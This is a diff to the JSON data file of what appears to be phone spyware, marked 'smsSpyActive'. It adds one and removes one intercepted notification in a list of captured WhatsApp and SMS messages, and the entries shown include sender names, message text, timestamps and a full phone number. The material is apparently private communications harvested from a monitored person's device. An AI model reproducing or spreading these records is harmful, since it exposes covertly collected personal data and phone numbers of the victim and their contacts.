@@ -21,6 +21,14 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "WhatsApp",
+        "sender": "Ibu Walikota",
+        "content": "Telepon suara tak terjawab",
+        "time": "01/04 21:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048874180
+      },
+      {
         "appName": "Messages",
         "sender": "BNI",
         "content": "Buka tabungan wondr by BNI dan dapatkan voucher Shopee sampai 100ribu khusus nasabah baru BNI.\nYuk install: myads.id/Dz0Yb\nTnC: bni.id/reward-bni-telkomsel\n\nPenawaran/info ini bermanfaat? Jika tidak, Kirim STOP BNI ke 8000",
@@ -4011,14 +4019,6 @@
         "time": "01/04 20:40",
         "pkg": "com.whatsapp",
         "receivedAt": 1775047226387
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎🇫🇮GB OPTEST XEMETRIX ELITE🇫🇮 (49 pesan): ~ ?",
-        "content": "📷 gg @⁨+62 813-1935-3554⁩",
-        "time": "01/04 20:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047226297
       }
     ],
     "galleryPhotos": [],
